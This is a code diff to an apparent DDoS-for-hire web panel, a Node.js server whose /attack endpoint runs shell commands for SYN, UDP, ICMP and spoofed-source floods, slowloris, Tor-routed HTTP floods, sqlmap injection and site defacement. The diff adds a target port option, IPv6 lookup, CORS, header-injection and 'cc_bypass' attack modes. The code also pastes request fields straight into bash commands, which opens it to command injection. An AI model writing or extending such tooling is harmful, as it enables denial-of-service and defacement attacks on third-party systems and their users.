@@ -13,7 +13,9 @@ const si = require('systeminformation');
 const dns = require('dns');
 const net = require('net');
 const { spawn } = require('child_process');
+const cors = require('cors');
 
+app.use(cors());
 app.use(express.static('public'));
 app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
@@ -54,7 +56,7 @@ const log = (message) => {
 
 const apiLimiter = rateLimit({
     windowMs: 15 * 60 * 1000,
-    max: 100000,
+    max: 1000000,
     message: 'Too many requests, try again after 15 minutes',
     standardHeaders: true,
     legacyHeaders: false,
@@ -136,7 +138,13 @@ function resolveTarget(target) {
         } else {
             dns.resolve4(target, (err, addresses) => {
                 if (err) {
-                    reject(err);
+                    dns.resolve6(target, (err6, addresses6) => {
+                        if (err6) {
+                            reject(err);
+                        } else {
+                            resolve(addresses6[0]);
+                        }
+                    });
                 } else {
                     resolve(addresses[0]);
                 }
@@ -164,6 +172,7 @@ app.post('/attack', async (req, res) => {
     const intensity = parseInt(req.body.intensity) || 100;
     const userApiKey = req.headers['x-api-key'];
     const bypass = req.body.bypass || false;
+    const port = parseInt(req.body.port) || 80;
 
     if (userApiKey !== apiKey) {
         log('Error: Unauthorized API key.');
@@ -194,20 +203,20 @@ app.post('/attack', async (req, res) => {
 
     switch (attackType) {
         case 'ddos':
-            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do curl -A 'Noodles-DDoS' --http1.1 -s -o /dev/null ${encodedTarget} & done; done"`;
+            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do curl -A 'Noodles-DDoS' --http1.1 -s -o /dev/null ${encodedTarget}:${port} & done; done"`;
             break;
         case 'deface':
             const defaceScript = `<h1>Hacked by Noodles!</h1><img src="https://i.imgur.com/xxxxx.gif" style="width: 100%; height: auto;">`;
-            command = `timeout ${duration} bash -c "curl -X PUT -H 'Content-Type: text/html' -d $'${defaceScript}' ${encodedTarget}/index.html"`;
+            command = `timeout ${duration} bash -c "curl -X PUT -H 'Content-Type: text/html' -d $'${defaceScript}' ${encodedTarget}:${port}/index.html"`;
             break;
         case 'connect':
-            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do nc -v ${encodedTarget} 80 & done; done"`;
+            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do nc -v ${encodedTarget} ${port} & done; done"`;
             break;
         case 'tor_ddos':
             try {
                 const externalIp = await publicIp.v4();
                 log(`Attacker IP: ${externalIp}`);
-                command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do proxychains4 curl -A 'Noodles-Tor-DDoS' -s -o /dev/null ${encodedTarget} & done; done"`;
+                command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do proxychains4 curl -A 'Noodles-Tor-DDoS' -s -o /dev/null ${encodedTarget}:${port} & done; done"`;
             } catch (error) {
                 log(`Error getting public IP: ${error.message}`);
                 return res.status(500).send(`Error getting public IP: ${error.message}`);
@@ -217,15 +226,15 @@ app.post('/attack', async (req, res) => {
             command = `sqlmap --url "${encodedTarget}" --dbs --batch --level 5 --risk 3`;
             break;
         case 'slowloris':
-            command = `timeout ${duration} perl slowloris.pl -dns ${encodedTarget} -port 80 -num ${intensity * 50}`;
+            command = `timeout ${duration} perl slowloris.pl -dns ${encodedTarget} -port ${port} -num ${intensity * 50}`;
             break;
 
         case 'udp_flood':
-            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do hping3 --udp -s 53 -p 53 --flood --rand-source ${encodedTarget} & done; done"`;
+            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do hping3 --udp -s ${port} -p ${port} --flood --rand-source ${encodedTarget} & done; done"`;
             break;
 
         case 'syn_flood':
-            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do hping3 -S --flood --rand-source ${encodedTarget} & done; done"`;
+            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do hping3 -S -p ${port} --flood --rand-source ${encodedTarget} & done; done"`;
             break;
 
         case 'ping_flood':
@@ -237,16 +246,16 @@ app.post('/attack', async (req, res) => {
             break;
 
         case 'http_flood':
-            command = `timeout ${duration} bash -c "while true; do wrk -t${numThreads} -c${intensity * 10} -d${duration} ${encodedTarget}; done"`;
+            command = `timeout ${duration} bash -c "while true; do wrk -t${numThreads} -c${intensity * 10} -d${duration} ${encodedTarget}:${port}; done"`;
             break;
 
         case 'tcp_flood':
-            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do hping3 -S -p 80 --flood --rand-source ${encodedTarget} & done; done"`;
+            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do hping3 -S -p ${port} --flood --rand-source ${encodedTarget} & done; done"`;
             break;
 
         case 'spoofed_flood':
             const spoofedIp = generateRandomIP();
-            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do hping3 -S -p 80 -a ${spoofedIp} --flood ${encodedTarget} & done; done"`;
+            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do hping3 -S -p ${port} -a ${spoofedIp} --flood ${encodedTarget} & done; done"`;
             break;
 
         case 'icmp_flood':
@@ -284,11 +293,11 @@ app.post('/attack', async (req, res) => {
             break;
 
         case 'slow_read':
-            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do python3 slow_read.py ${encodedTarget} & done; done"`;
+            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do python3 slow_read.py ${encodedTarget}:${port} & done; done"`;
             break;
 
         case 'pod_flood':
-            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do hping3 --icmp --icmp-ts --flood --rand-source -p <port> ${encodedTarget} & done; done"`;
+            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do hping3 --icmp --icmp-ts --flood --rand-source -p ${port} ${encodedTarget} & done; done"`;
             break;
 
         case 'payload':
@@ -297,7 +306,7 @@ app.post('/attack', async (req, res) => {
                 log('Error: Payload is required for payload attack.');
                 return res.status(400).send('Payload is required for payload attack.');
             }
-            command = `timeout ${duration} bash -c "echo '${payload}' | nc ${encodedTarget} 80"`;
+            command = `timeout ${duration} bash -c "echo '${payload}' | nc ${encodedTarget} ${port}"`;
             break;
 
         case 'rudy':
@@ -327,7 +336,7 @@ app.post('/attack', async (req, res) => {
                 log('Error: Raw TCP payload is required for raw_tcp attack.');
                 return res.status(400).send('Raw TCP payload is required for raw_tcp attack.');
             }
-            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do echo -ne '${rawPayload}' | nc ${encodedTarget} 80 & done; done"`;
+            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do echo -ne '${rawPayload}' | nc ${encodedTarget} ${port} & done; done"`;
             break;
 
         case 'custom':
@@ -345,9 +354,29 @@ app.post('/attack', async (req, res) => {
                 log('Error: Layer7 method is required for layer7 attack.');
                 return res.status(400).send('Layer7 method is required for layer7 attack.');
             }
-            command = `node layer7.js --target ${encodedTarget} --method ${layer7Method} --duration ${duration} --threads ${numThreads} ${layer7Options}`;
+            command = `node layer7.js --target ${encodedTarget} --method ${layer7Method} --duration ${duration} --threads ${numThreads} --port ${port} ${layer7Options}`;
             break;
 
+        case 'http_header_injection':
+                const headerName = req.body.headerName;
+                const headerValue = req.body.headerValue;
+                if (!headerName || !headerValue) {
+                    log('Error: Header name and value are required for HTTP header injection attack.');
+                    return res.status(400).send('Header name and value are required for HTTP header injection attack.');
+                }
+                command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do curl -H '${headerName}: ${headerValue}' ${encodedTarget}:${port} & done; done"`;
+                break;
+
+        case 'cc_bypass':
+            const ccBypassMethod = req.body.ccBypassMethod;
+            const ccBypassData = req.body.ccBypassData;
+
+            if (!ccBypassMethod || !ccBypassData) {
+                log('Error: CC Bypass method and data are required');
+                return res.status(400).send('CC Bypass method and data are required');
+            }
+            command = `timeout ${duration} bash -c "node cc_bypass.js --target ${encodedTarget}:${port} --method ${ccBypassMethod} --data '${ccBypassData}' --threads ${numThreads}"`;
+            break;
 
         default:
             log(`Error: Invalid attack type: ${attackType}`);
@@ -412,6 +441,23 @@ app.get('/download/:file', (req, res) => {
 
         res.download(filePath);
     });
+});
+
+app.use((err, req, res, next) => {
+    console.error(err.stack);
+    log(`Fatal error: ${err.message}`);
+    res.status(500).send('Something broke!');
+});
+
+process.on('uncaughtException', (err) => {
+    console.error('Uncaught Exception:', err);
+    log(`Uncaught Exception: ${err.message}`);
+    process.exit(1);
+});
+
+process.on('unhandledRejection', (reason, promise) => {
+    console.error('Unhandled Rejection at:', promise, 'reason:', reason);
+    log(`Unhandled Rejection: ${reason}`);
 });
 
 const PORT = process.env.PORT || 3000;
